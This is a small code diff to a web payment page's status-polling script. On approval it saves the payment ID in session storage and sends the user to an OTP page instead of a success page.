@@ -832,7 +832,8 @@
           if (st === 'accept' || st === 'approved') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
-            window.location.href = data.redirect || 'success-ar.html';
+            sessionStorage.setItem('aman_bank_request_id', paymentId);
+            window.location.href = data.redirect || 'otp.html?id=' + paymentId;
           } else if (st === 'reject' || st === 'declined' || st === 'error') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
